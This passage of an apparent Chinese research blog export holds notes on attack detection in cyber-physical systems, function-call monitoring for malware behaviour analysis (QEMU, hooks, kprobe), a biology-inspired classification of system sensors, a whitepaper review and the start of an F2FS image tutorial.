    <url>/2021/05/10/%E4%BF%A1%E6%81%AF%E7%89%A9%E7%90%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%AE%89%E5%85%A8%E7%8A%B6%E6%80%81%E4%BC%B0%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><ul>
<li>有限时间异常检测器：负责在预设的有限时间内检测攻击（异常）</li>
<li>系统安全状态观测器：负责状态评估，并在检测到攻击时，调整系统以确保安全状态</li>
</ul>
<p>安全状态估计：是从一组有噪声或被破坏的测量值中估计动态系统状态</p>
<p>本文概要：提出一种<strong>有限时间检测器</strong>来检测<strong>执行器</strong>攻击下系统的状态，并设计<strong>观测器</strong>对系统状态进行<strong>安全估计</strong></p>
<h3 id="1-信息物理系统建模"><a href="#1-信息物理系统建模" class="headerlink" title="1 信息物理系统建模"></a>1 信息物理系统建模</h3><h4 id="1-1-物理进程模型"><a href="#1-1-物理进程模型" class="headerlink" title="1.1 物理进程模型"></a>1.1 物理进程模型</h4><p>用微分/差分方程组进行描述：比如线性系统的状态空间模型</p>
<h4 id="1-2-信息传输处理进程模型"><a href="#1-2-信息传输处理进程模型" class="headerlink" title="1.2 信息传输处理进程模型"></a>1.2 信息传输处理进程模型</h4><p>用编码解码，加解密进行描述</p>
<h4 id="1-3-攻击的具象"><a href="#1-3-攻击的具象" class="headerlink" title="1.3 攻击的具象"></a>1.3 攻击的具象</h4><ul>
<li>作用到进程的未知输入</li>
<li>对传输过程的破坏</li>
<li>对传输信息的篡改</li>
</ul>
<h4 id="1-4-系统建模"><a href="#1-4-系统建模" class="headerlink" title="1.4 系统建模"></a>1.4 系统建模</h4><script type="math/tex; mode=display">
\begin{cases}
\dot{x}(t)=Ax(t)+Bu(t)+Dv(t),\\\\
y(t)=Cx(t).
\end{cases}\tag{1}</script><p>x 为系统状态，u 为已知输入，v 为未知攻击，y 为可测量的系统输出</p>
<h3 id="2-有限时间检测器"><a href="#2-有限时间检测器" class="headerlink" title="2 有限时间检测器"></a>2 有限时间检测器</h3><p>针对公式 (1) 提出检测器</p>
<script type="math/tex; mode=display">
\begin{cases}
\dot{z}=Fz(t)+HBu(t)+Ly(t),\ \ \ \ \ \ \ \ \ \ \ (观测器状态) \\\\
\widehat{x}=M[z(t)-F^{\tau}z(t-\tau)] \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ (系统估计值)
\end{cases}\tag{2}</script><p>由可测量的<strong>系统输出</strong>和<strong>已知输入</strong>获取观测器状态，检测器可以在未知攻击的值不为 0 时将其检测出来</p>
<h3 id="3-观测器：对有限时间检测器的改进"><a href="#3-观测器：对有限时间检测器的改进" class="headerlink" title="3 观测器：对有限时间检测器的改进"></a>3 观测器：对有限时间检测器的改进</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CAPJ&amp;dbname=CAPJLAST&amp;filename=QHXB20210205002&amp;v=w2buZ2%25mmd2FeXYTSHR5oD%25mmd2Bmxbz8x1rI6W%25mmd2F8Z8iZAOvZv8zxIISAv0Xu%25mmd2Fx4BEddWaKYM7">https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CAPJ&amp;dbname=CAPJLAST&amp;filename=QHXB20210205002&amp;v=w2buZ2%25mmd2FeXYTSHR5oD%25mmd2Bmxbz8x1rI6W%25mmd2F8Z8iZAOvZv8zxIISAv0Xu%25mmd2Fx4BEddWaKYM7</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>异常检测</tag>
      </tags>
  </entry>
  <entry>
    <title>函数监控的调研</title>
    <url>/2021/07/19/%E5%87%BD%E6%95%B0%E7%9B%91%E6%8E%A7%E7%9A%84%E8%B0%83%E7%A0%94/</url>
    <content><![CDATA[<h2 id="1-基于函数监控的恶意程序行为自动分析方法研究与实现"><a href="#1-基于函数监控的恶意程序行为自动分析方法研究与实现" class="headerlink" title="1 基于函数监控的恶意程序行为自动分析方法研究与实现"></a>1 基于函数监控的恶意程序行为自动分析方法研究与实现</h2><p><a href="https://d.wanfangdata.com.cn/thesis/ChJUaGVzaXNOZXdTMjAyMDEwMjgSB0Q3MjcwMzQaCDRzM2J6bTFi">https://d.wanfangdata.com.cn/thesis/ChJUaGVzaXNOZXdTMjAyMDEwMjgSB0Q3MjcwMzQaCDRzM2J6bTFi</a></p>
<p>此篇文章的函数监控，搭建了一个能捕获程序调用的 API 的系统，利用模拟器 QEMU 设计了 API 及参数信息捕获工具。在配有该系统的沙盒中运行恶意程序，监控并记录运行过程中被调用的系统 API，获得程序运行时完整的 API 调用序列及参数内容。</p>
<hr>
<ul>
<li>拓展</li>
</ul>
<p>QEMU 是一款基于动态二进制翻译机制的 PC 模拟器，其翻译技术基于代码基本块，即 QEMU 按顺序翻译执行指令块，该方式具有较高的执行效率，而且 QEMU 能够模拟完整的 PC，包括：处理器、显卡、硬盘等硬件设备。通过对 QEMU 的源代码的修改，可以实现在 QEMU 模拟的系统中捕获程序执行时调用的 API 信息。</p>
<hr>
<p>在进一步的判定过程中，该文涉及我此前提出的一个在疑的问题，那就是：直接使用调用序列是无法完全正确地判定当前过程是否非法的。该文有一个<strong>行为抽象</strong>的过程，每个函数的信息抽象成一项行为信息，从行为中提取特征，随即从调用序列中得到样本行为。</p>
<h3 id="行为抽象的具体过程"><a href="#行为抽象的具体过程" class="headerlink" title="行为抽象的具体过程"></a>行为抽象的具体过程</h3><ol>
<li><p>根据函数名判断是否是关键函数</p>
<p>有些无法形成危险行为的函数需要被过滤掉。比较关键的函数比如：文件操作相关，注册表操作相关，进程线程相关，网络行为相关，系统服务相关等</p>
</li>
<li><p>获取参数位置并读取信息</p>
<p>同样的也不是每个参数都需要被关注，主要参数内容包括：文件、注册表路径、操作权限等</p>
</li>
<li><p>宏转换，将宏转换成字符串</p>
</li>
<li><p>将分段参数合成为完整参数</p>
<p>行为抽象过程中需要记录 API 函数中可以说明 API 功能的参数。有些函数可能有很多个参数，需要合到一起才能表征一种行为或者特征</p>
</li>
<li><p>形成行为</p>
</li>
</ol>
<p><img src="/2021/07/19/%E5%87%BD%E6%95%B0%E7%9B%91%E6%8E%A7%E7%9A%84%E8%B0%83%E7%A0%94/image-20210719173537881.png" alt="image-20210719173537881"></p>
<h2 id="2-一种统计应用程序中的函数调用的方法及组件"><a href="#2-一种统计应用程序中的函数调用的方法及组件" class="headerlink" title="2 一种统计应用程序中的函数调用的方法及组件"></a>2 一种统计应用程序中的函数调用的方法及组件</h2><p><a href="https://nxgp.cnki.net/kcms/detail?v=kxaUMs6x7-4I2jr5WTdXti3zQ9F92xu01YaOO4mI95VxvO7h7QlMcsuYQn77PKrH0As7W0iLBY14MHbYvq00pjSi1GxubV51&amp;uniplatform=NZKPT">https://nxgp.cnki.net/kcms/detail?v=kxaUMs6x7-4I2jr5WTdXti3zQ9F92xu01YaOO4mI95VxvO7h7QlMcsuYQn77PKrH0As7W0iLBY14MHbYvq00pjSi1GxubV51&amp;uniplatform=NZKPT</a></p>
<p>在应用程序运行时，利用钩子函数监控统计调用信息文件MAP文件中所有函数的函数头在预设时间内各自的调用次数及调用时刻，然后利用钩子函数监控统计</p>
<p>函数尾的调用时刻。基于MAP文件中所述函数头和函数尾的调用时刻，确定所有函数在所述预设时间内的调用时间。</p>
<p>MAP文件：map文件是通过编译器编译之后，集程序、数据及IO空间的一种映射文件。<a href="https://www.pianshen.com/article/1727600516/">关于_map文件的全面解析 - 程序员大本营 (pianshen.com)</a></p>
<h2 id="3-基于虚拟化的安全监控"><a href="#3-基于虚拟化的安全监控" class="headerlink" title="3 基于虚拟化的安全监控"></a>3 基于虚拟化的安全监控</h2><p><a href="https://d.wanfangdata.com.cn/periodical/rjxb201208019">https://d.wanfangdata.com.cn/periodical/rjxb201208019</a></p>
<p>[期刊论文全文] 项国富 , 金海 , 邹德清 , 陈学广 , XIANG Guo-Fu , JIN Hai , ZOU De-Qing , CHEN Xue-Guang - 《软件学报》 - 2012年8期</p>
<p>虚拟机管理器具有更高的权限和更小的可信计算基，其位于操作系统与真实硬件平台之间，比操作系统的特权级更高，代码量更小。</p>
<ol>
<li>内部监控：在虚拟机中加载内核模块来拦截目标虚拟机的内部事件，而内核模块的安全通过<strong>虚拟机管理器</strong>来进行保护</li>
<li>外部监控：通过在虚拟机管理器中对虚拟机中事件进行拦截，从而在虚拟机外部进行检测</li>
</ol>
<h2 id="4-Kprobe"><a href="#4-Kprobe" class="headerlink" title="4 Kprobe"></a>4 Kprobe</h2><p>1）注册kprobe。注册的每个kprobe对应一个kprobe结构体，该结构体记录着插入点（位置），以及该插入点本来对应的指令original_opcode；</p>
<p>2）替换原有指令。使能kprobe的时候，将插入点位置的指令替换为一条异常（BRK）指令，这样当CPU执行到插入点位置时会陷入到异常态；</p>
<p>3）执行pre_handler。进入异常态后，首先执行pre_handler，然后利用CPU提供的单步调试（single-step）功能，设置好相应的寄存器，将下一条指令设置为插入点处本来的指令，从异常态返回；</p>
<p>4）再次陷入异常态。上一步骤中设置了single-step相关的寄存器，所以original_opcode刚一执行，便会二进宫：再次陷入异常态，此时将signle-step清楚，并且执行post_handler，然后从异常态安全返回。</p>
<p>步骤2），3），4）便是一次kprobe工作的过程，它的一个基本思路就是将本来执行一条指令扩展成执行kprobe-&gt;pre_handler—-&gt;指令—-&gt;kprobe—&gt;post_handler这样三个过程。下面详细解释每个过程</p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>函数监控</tag>
      </tags>
  </entry>
  <entry>
    <title>关于感受器的分类</title>
    <url>/2021/08/12/%E5%85%B3%E4%BA%8E%E6%84%9F%E5%8F%97%E5%99%A8%E7%9A%84%E5%88%86%E7%B1%BB/</url>
    <content><![CDATA[<h2 id="1-人-动物的感受器分类"><a href="#1-人-动物的感受器分类" class="headerlink" title="1 人/动物的感受器分类"></a>1 人/动物的感受器分类</h2><p><img src="/2021/08/12/%E5%85%B3%E4%BA%8E%E6%84%9F%E5%8F%97%E5%99%A8%E7%9A%84%E5%88%86%E7%B1%BB/image-20210812162618594.png" alt="image-20210812162618594" style="zoom: 50%;"></p>
<h3 id="1-1-内感受器-1"><a href="#1-1-内感受器-1" class="headerlink" title="1.1 内感受器$^{1}$"></a>1.1 内感受器$^{1}$</h3><p>分布在<strong>内脏和躯体深部</strong>的各种感受器。可接受机体内部的各种化学和物理性刺激将其转变为神经冲动，由传入神经传至相应的感觉中枢，产生不同的感觉。</p>
<p><img src="/2021/08/12/%E5%85%B3%E4%BA%8E%E6%84%9F%E5%8F%97%E5%99%A8%E7%9A%84%E5%88%86%E7%B1%BB/image-20210812160736428.png" alt="image-20210812160736428" style="zoom:67%;"></p>
<h4 id="1-1-1-分类"><a href="#1-1-1-分类" class="headerlink" title="1.1.1 分类"></a>1.1.1 分类</h4><h5 id="a-按感受器的分布"><a href="#a-按感受器的分布" class="headerlink" title="a. 按感受器的分布"></a>a. 按感受器的分布</h5><p>内感受器可分为<strong>本体感受器</strong>和<strong>内脏感受器</strong>。</p>
<ul>
<li>本体感受器</li>
</ul>
<p>主要分布于分布于骨骼肌、肌腱、关节、皮肤和内耳迷路以及上位颈椎。是以<strong>力学</strong>状态作为直接感觉刺激而使身体感知的感受器。主要感知运动时关节和肌肉的活动情况。</p>
<ul>
<li>内脏感受器</li>
</ul>
<p>主要分布于背根、交感、小肠节细胞、副交感神经网络等。</p>
<h5 id="b-按所感受的刺激性质"><a href="#b-按所感受的刺激性质" class="headerlink" title="b. 按所感受的刺激性质"></a>b. 按所感受的刺激性质</h5><ul>
<li>机械感受器：压力感受器、牵张感受器、容量感受器</li>
<li>化学感受器</li>
<li>温度感受器</li>
<li>痛觉感受器</li>
</ul>
<h3 id="1-2-外感受器-2-​"><a href="#1-2-外感受器-2-​" class="headerlink" title="1.2 外感受器$^{2}$​"></a>1.2 外感受器$^{2}$​</h3><p> 位于皮肤和体表的各类感受器。</p>
<ul>
<li>皮肤感受器：<strong>一般感觉器官</strong>，能接受冷、热。触、压等刺激，以形成<strong>冷觉、热觉、触觉和痛觉</strong>等。</li>
<li>视觉感受器</li>
<li>听觉感受器</li>
<li>味觉感受器</li>
<li>嗅觉感受器</li>
</ul>
<p>这种分类方式，本质上也是基于具体部位的功能，如<strong>皮肤感受器</strong>广泛存在于表皮的生发层和真皮的毛囊周围；视觉感受器就是眼睛；<strong>听觉感受器</strong>依赖基底膜上的科蒂氏器中包含的大量毛细胞；<strong>味觉感受器</strong>是分布在舌面各种乳突内的味蕾，更具体的味觉对应味蕾的不同区域；嗅觉感受器分布在鼻粘膜上部淡黄色的嗅上皮内。</p>
<h2 id="2-信息系统感受器分类"><a href="#2-信息系统感受器分类" class="headerlink" title="2 信息系统感受器分类"></a>2 信息系统感受器分类</h2><p>外感受器是信息系统内部环境感知外部环境的接口，在分布上应是与硬件沟通的媒介；内感受器则是系统内部参数</p>
<p><img src="/2021/08/12/%E5%85%B3%E4%BA%8E%E6%84%9F%E5%8F%97%E5%99%A8%E7%9A%84%E5%88%86%E7%B1%BB/image-20210817152158893.png" alt="image-20210817152158893"></p>
<h3 id="2-1-内感受器"><a href="#2-1-内感受器" class="headerlink" title="2.1 内感受器"></a>2.1 内感受器</h3><p>资源感受器：CPU使用量、内存使用量、磁盘利用率、系统负载。</p>
<p>本体（硬件）感受器：处理器健康状况、物理/逻辑驱动器故障、电源等级、磁盘和阵列、内存、CPU风扇速度、温度、电压等。</p>
<p>内核感受器：文件访问/读写、进程细节、线程数、进程数、僵死进程数等 <a href="http://www.joca.cn/CN/abstract/abstract12203.shtml">http://www.joca.cn/CN/abstract/abstract12203.shtml</a></p>
<h3 id="2-2-外感受器"><a href="#2-2-外感受器" class="headerlink" title="2.2 外感受器"></a>2.2 外感受器</h3><p>网络应用感受器：吞吐量、错误、网络流量、响应时间。</p>
<p>输入输出感受器：打印机、键盘、鼠标、显示器</p>
<h2 id="3-阶段小结"><a href="#3-阶段小结" class="headerlink" title="3 阶段小结"></a>3 阶段小结</h2><p>目前针对信息系统的感受器分类仍然比较浅显深度不够，还需增添细节和如此支撑的理由，在操作系统层面还需要更深入的探讨合理性和必要性。</p>
<h2 id="4-关于系统组成的研讨"><a href="#4-关于系统组成的研讨" class="headerlink" title="4 关于系统组成的研讨"></a>4 关于系统组成的研讨</h2><h3 id="4-1-PC"><a href="#4-1-PC" class="headerlink" title="4.1  PC"></a>4.1  PC</h3><p>包括：处理器，主板，内存，硬盘，显卡，显示器，声卡，网卡，蓝牙，电池，指纹，键鼠等。有关的检测或者说传感器容易联想到的包括：连接检测（WLAN检测和蓝牙检测等）、音频检测、设备温度的检测（CPU、显卡温度等）、驱动检测（如各种设备的驱动程序是否安装或正常运行等）</p>
<h3 id="4-2-嵌入式系统"><a href="#4-2-嵌入式系统" class="headerlink" title="4.2 嵌入式系统"></a>4.2 嵌入式系统</h3><p>参考 嵌入式系统：组成、原理与设计编程</p>
<p>嵌入式系统主要组成部分：处理器、存储器、LCD控制器（针对带LCD的嵌入式系统）、外设接口、通信接口、输入输出设备</p>
<p><img src="/2021/08/12/%E5%85%B3%E4%BA%8E%E6%84%9F%E5%8F%97%E5%99%A8%E7%9A%84%E5%88%86%E7%B1%BB/image-20210825152513735.png" alt="image-20210825152513735"></p>
<h3 id="4-3-移动通信系统"><a href="#4-3-移动通信系统" class="headerlink" title="4.3 移动通信系统"></a>4.3 移动通信系统</h3><p>移动通信系统的组成：移动台MS、基站、移动交换中心MSC、无限小区、中继线。移动台：由操作部分，控制单元，收、发信单元，双工滤波器及电源构成。</p>
<p><img src="/2021/08/12/%E5%85%B3%E4%BA%8E%E6%84%9F%E5%8F%97%E5%99%A8%E7%9A%84%E5%88%86%E7%B1%BB/image-20210825152754091.png" alt="image-20210825152754091" style="zoom:80%;"></p>
<p>可以抽象成：移动基站、传输媒介（无线小区：基站覆盖的区域、中继线：连接终端的交换机）、交换设备、接收终端（移动台）。</p>
<p><img src="/2021/08/12/%E5%85%B3%E4%BA%8E%E6%84%9F%E5%8F%97%E5%99%A8%E7%9A%84%E5%88%86%E7%B1%BB/image-20210825152836617.png" alt="image-20210825152836617" style="zoom:80%;"></p>
<h3 id="4-4-物联网系统-3"><a href="#4-4-物联网系统-3" class="headerlink" title="4.4 物联网系统$^{3}$"></a>4.4 物联网系统$^{3}$</h3><p>大致由：内核、通信支持、外围组件、行业应用组成。</p>
<ul>
<li>内核具备完善的线程调度、内存管理、本地存储、复杂的网络协议、图形用户界面等功能，以满足高配置的智能物联网终端的要求，这里需要处理器和存储器的支撑。</li>
<li>通信支持：WiFi/蓝牙、2/3/4G等通信支持、NFC、RS232/PLC支持等。（GPRS/3G/HSPA/4G等公共网络的无线通信功能，同时要支持Zigbee/NFC/RFID等近场通信功能，支持WLAN/Ethernet等桌面网络接口功能。）</li>
<li>外围组件包括：文件系统、GUI、外部存储、也包含一些文件解析器等</li>
<li>行业应用本质上是为了让物联网支撑各种需求而提供的丰富的API</li>
</ul>
<h2 id="5-阶段小结"><a href="#5-阶段小结" class="headerlink" title="5 阶段小结"></a>5 阶段小结</h2><h3 id="5-1-感受器的内与外"><a href="#5-1-感受器的内与外" class="headerlink" title="5.1 感受器的内与外"></a>5.1 感受器的内与外</h3><p>不管是PC还是通信系统，其组成上都可以抽象地划分出内与外。</p>
<p>对于PC来说，<strong>外感受器</strong>会受到来自本机以外环境的因素影响，比如键鼠等，这些外部设备接收操作人员的输入信息对PC进行控制。除了本地操作人员的影响外，设备可能还会受到网络其他端的影响，也许是远程合法操作人员的操作也可能是非法攻击造成的远程入侵。</p>
<p>同样的，嵌入式系统也存在这样的外部输入，可能来自键盘或者触摸屏的输入。</p>
<p>移动通信系统和前述的系统略有差别，在组成方面，移动通信系统涉及基站、媒介、交换设备和终端。从宏观角度看，其实所有的可以互相通信的终端设备都在一个移动通信系统之中，当我们从更细些的角度去看，实际上来自其他蜂窝/小区的终端可以通过<strong>中继线</strong>，<strong>移动交换中心</strong>等连接到本小区终端进行通信，或者存在隐藏终端攻击(HTE)时攻击者发起的外部输入$^{4}$​​​​​​​。</p>
<p>物联网系统与PC和嵌入式系统是比较类似的，外部感受器可以针对外部存储、远端、蓝牙、NFC等。</p>
<p>对于<strong>内感受器</strong>，PC包含的东西就很多了，比如处理器、主板、内存、硬盘、显卡、显示器、声卡、电池、指纹等，因为这些模块或者设备都是PC本体的设备，如果想更高效更安全地使用PC，对内做感受器/传感器来感知如CPU利用率、CPU温度、显卡温度、内存使用情况、硬盘使用情况、声卡网卡地驱动情况、电池电量、指纹可用性等方面，可以在PC遇到故障或者需要更高效完成任务时提供更完善的方案，比如在CPU温度过高时降频、电池电量较低时使用省电模式（通过限制非关键应用的后台执行）等。</p>
<p>嵌入式系统内部可以感知处理器、存储器、LCD控制器、LCD（针对带LCD的嵌入式系统）等</p>
<p>当考虑移动通信系统内部时，与考虑外部一样，我们可以将本蜂窝/小区看作一个整体，本地终端以及基站/传输媒介都在范围内。</p>
<p>物联网系统的内部感受器可以感知处理器和存储器等本体情况</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">感受器分类</th>
<th>PC</th>
<th>嵌入式系统</th>
<th>移动通信系统</th>
<th>物联网系统</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">外感受器</td>
<td>本地键鼠、USB、远端网络连接、蓝牙</td>
<td>键盘、USB、触摸屏、蓝牙、外设接口、远端嵌入式系统或其他设备</td>
<td>非本地终端、隐藏终端、移动交换中心、中继线</td>
<td>外部存储、远端设备、蓝牙、NFC、一些API</td>
</tr>
<tr>
<td style="text-align:left">内感受器</td>
<td>处理器、主板、内存、硬盘、显卡、显示器、声卡、电池、指纹</td>
<td>处理器、存储器、LCD控制器、LCD</td>
<td>接收终端、基站、无线小区</td>
<td>处理器、存储器</td>
</tr>
</tbody>
</table>
</div>
<h3 id="5-2-进一步的分类"><a href="#5-2-进一步的分类" class="headerlink" title="5.2 进一步的分类"></a>5.2 进一步的分类</h3><h4 id="5-2-1-外感受器"><a href="#5-2-1-外感受器" class="headerlink" title="5.2.1 外感受器"></a>5.2.1 外感受器</h4><p>类似人/动物的感受器分类中，如果根据感受器所感知的性质，可以将外感受器分成感知<strong>近邻</strong>和<strong>远端</strong>两种，其中近邻感受器主要针对一些直插式设备接入本系统或者类似信息通信系统的本地终端。</p>
<p>比如PC的外接键鼠、USB、蓝牙等。这里可能会有对显示设备的疑惑，即：为什么显示屏也算是外接设备，但却没有放在近邻感受器这一范畴？原因其实很简单——显示设备是将PC内部的数据经过一系列可视化处理以后向外输出的，本质上来说，这是感受内部数据的变化的，因此不妨在内感受器中探讨。另外，在嵌入式系统中，类似的，外接键盘或者接口一些接口，或是USB、蓝牙都是近邻的获取外来影响因素的途径，这里某些嵌入式系统是带触摸屏的，因此将该器件也纳入近邻感受器的类别中（因为触摸屏是感知外部输入的途径之一）。近邻感受器在移动通信系统中表现为对本地（隐藏）终端、基站、移动交换中心的感知，因为本蜂窝/小区是通过基站和移动交换中心与其他蜂窝进行通信的。物联网系统与PC也比较类似，其近邻可以感知外部存储、蓝牙、NFC等。</p>
<p>远端感受相对来说比较简单，PC、嵌入式系统、物联网的远端设备是通过网络连接影响本体设备的，移动通信系统则是中继线$^{5}$。</p>
<p><img src="/2021/08/12/%E5%85%B3%E4%BA%8E%E6%84%9F%E5%8F%97%E5%99%A8%E7%9A%84%E5%88%86%E7%B1%BB/image-20210825203707047.png" alt="image-20210825203707047" style="zoom:67%;"></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>外感受器</th>
<th>PC</th>
<th>嵌入式系统</th>
<th>移动通信系统</th>
<th>物联网系统</th>
</tr>
</thead>
<tbody>
<tr>
<td>近邻感受器</td>
<td>本地键鼠、USB、蓝牙</td>
<td>键盘、USB、触摸屏、蓝牙、外设接口</td>
<td>本地隐藏终端、移动交换中心</td>
<td>外部存储、蓝牙、NFC、一些API</td>
</tr>
<tr>
<td>远端感受器</td>
<td>远端网络连接(网卡)</td>
<td>远端嵌入式系统或其他设备的网络连接</td>
<td>中继线</td>
<td>远端设备网络连接</td>
</tr>
</tbody>
</table>
</div>
<h4 id="5-2-2-内感受器"><a href="#5-2-2-内感受器" class="headerlink" title="5.2.2 内感受器"></a>5.2.2 内感受器</h4><p>对于PC来说，内部设备非常丰富：处理器、主板、内存、硬盘、显卡、显示器、声卡、电池、指纹，如果单纯按照设备进行分类会过于具体，而且每添加一个设备就会添加一个新标准，因此需要按照我们需要的或者说可以获得的内部参数进行分类。比如，我们可能会关注电源情况：电源检测以确定进入性能模式还是节电模式。可能关注设备温度及资源使用情况，比如PC的处理器和显卡等温度较高时，可以通过降频或者锁帧等方法确保系统正常工作，嵌入式系统同理；资源使用方面，当处理器被占用过多，可能需要通过调整应用使用状态或其他一些修改使关键任务得以正常执行与完成。对于移动通信系统来说，还是认为一个蜂窝为一个本体，那么认为基站属于该主体的内部设备，基站基本组成为：信号收发器、监控装置、灭火装置、供电设备、空调设备、馈电系统、无线反射器等$^{6}$​​​。各系统的核心控制或者处于底层的某些关键操作，这些操作可能会影响整个系统或系统中某个模块和单元的正常运作，需要事件感受器来做更深入的感知。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>内感受器</th>
<th>PC</th>
<th>嵌入式系统</th>
<th>移动通信系统</th>
<th>物联网系统</th>
</tr>
</thead>
<tbody>
<tr>
<td>电源感受器</td>
<td>电源检测</td>
<td>电源检测</td>
<td>电源检测、馈电系统</td>
<td>电源检测</td>
</tr>
<tr>
<td>设备温度感受器</td>
<td>处理器、主板、显卡温度</td>
<td>处理器温度</td>
<td>空调设备</td>
<td>处理器温度</td>
</tr>
<tr>
<td>资源感受器</td>
<td>处理器、内存调度、硬盘使用情况</td>
<td>处理器使用率、存储器管理</td>
<td>双工滤波器等设备使用情况</td>
<td>处理器、存储管理</td>
</tr>
<tr>
<td>视听感受器</td>
<td>显示屏、声卡</td>
<td>屏幕、音频采集</td>
<td>无（不涉及）</td>
<td>图形用户界面</td>
</tr>
<tr>
<td>事件感受器</td>
<td>进程细节、核心文件读写</td>
<td>获取/发送事件、中断机制、控制器</td>
<td>控制单元、收/发信单元</td>
<td>线程调度</td>
</tr>
</tbody>
</table>
</div>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li><a href="https://baike.baidu.com/item/%E5%86%85%E6%84%9F%E5%8F%97%E5%99%A8/4215030?fr=aladdin">https://baike.baidu.com/item/%E5%86%85%E6%84%9F%E5%8F%97%E5%99%A8/4215030?fr=aladdin</a></li>
<li><a href="https://baike.baidu.com/item/%E5%A4%96%E6%84%9F%E5%8F%97%E5%99%A8/4215264?fr=aladdin">https://baike.baidu.com/item/%E5%A4%96%E6%84%9F%E5%8F%97%E5%99%A8/4215264?fr=aladdin</a></li>
<li><a href="https://baike.baidu.com/item/物联网操作系统/6370494?fr=aladdin">参考 物联网操作系统</a></li>
<li><a href="https://ieeexplore.ieee.org/document/8964452">https://ieeexplore.ieee.org/document/8964452</a></li>
<li><a href="https://wenku.baidu.com/view/911201e3bb1aa8114431b90d6c85ec3a86c28be6.html">https://wenku.baidu.com/view/911201e3bb1aa8114431b90d6c85ec3a86c28be6.html</a></li>
<li><a href="https://baike.baidu.com/item/%E5%9F%BA%E7%AB%99/1260692?fr=aladdin#3">https://baike.baidu.com/item/%E5%9F%BA%E7%AB%99/1260692?fr=aladdin#3</a></li>
</ol>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>信息系统仿生安全</tag>
      </tags>
  </entry>
  <entry>
    <title>读中兴的网络安全愿景白皮书</title>
    <url>/2021/07/04/%E5%85%B3%E4%BA%8E%E4%B8%AD%E5%85%B4%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%84%BF%E6%99%AF%E7%99%BD%E7%9A%AE%E4%B9%A6/</url>
    <content><![CDATA[<ul>
<li>定义</li>
</ul>
<p>关于对内生安全的定义，与我们课题组的思想基本一致。我们都希望构建一个具备自适应、自学习、自生长能力的，可以自主进行安全调控的，一个安全与功能高度融合的系统。</p>
<ul>
<li>愿景</li>
</ul>
<p><img src="/2021/07/04/%E5%85%B3%E4%BA%8E%E4%B8%AD%E5%85%B4%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%84%BF%E6%99%AF%E7%99%BD%E7%9A%AE%E4%B9%A6/image-20210704155523983.png" alt="image-20210704155523983" style="zoom:80%;"></p>
<p>其畅想，未来网络架构将走向一体化，从其未来网络架构图中，其实并未体现这个一体化。关于图 2 的能力体系，是挺有意思的：以统一身份与信任体系为基础，建立边界、网元、全网三道防线。</p>
<font face="楷体" color="grey">其在畅想中提出，网络内生安全作为广义网络的基础能力而存在，类似人的免疫体系。这个跟定义中提到的概念也是相关的，不过我们认为免疫的概念难以与传统的异常检测做区分，人体的免疫系统中 B 细胞、T 细胞等等的联合作用在本质上仍是异常检测，理论上唯一的不同可能是后期的调整与处理。人体的免疫体系与神经控制体系的关联是紧密的，面向以任务为导向的系统应用时，我们可能更倾向于对神经控制系统的映射与应用。</font>

<ul>
<li>可能的发展</li>
</ul>
<p><img src="/2021/07/04/%E5%85%B3%E4%BA%8E%E4%B8%AD%E5%85%B4%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%84%BF%E6%99%AF%E7%99%BD%E7%9A%AE%E4%B9%A6/image-20210704160236775.png" alt="image-20210704160236775" style="zoom:80%;"></p>
<p>对于 AI 和系统模型建立，我们课题组在先前的论文中已经有所提及，在未来我认为度量方法会是一个很有前景的研究方向。</p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>想法</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Ubuntu虚拟机制作F2FS文件系统镜像</title>
    <url>/2020/10/30/%E5%88%A9%E7%94%A8Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%B6%E4%BD%9CF2FS%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<h2 id="新建一个1G磁盘并分区"><a href="#新建一个1G磁盘并分区" class="headerlink" title="新建一个1G磁盘并分区"></a>新建一个1G磁盘并分区</h2><ol>
<li>关闭虚拟机</li>
<li>虚拟机添加硬盘<br><img src="/2020/10/30/%E5%88%A9%E7%94%A8Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%B6%E4%BD%9CF2FS%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F/1931211-20201030103009721-2101269955.png" alt="img"><br><img src="/2020/10/30/%E5%88%A9%E7%94%A8Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%B6%E4%BD%9CF2FS%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F/1931211-20201030103043318-115915093.png" alt="img"><br><img src="/2020/10/30/%E5%88%A9%E7%94%A8Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%B6%E4%BD%9CF2FS%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F/1931211-20201030103049223-412645221.png" alt="img"></li>
<li>开启虚拟机</li>
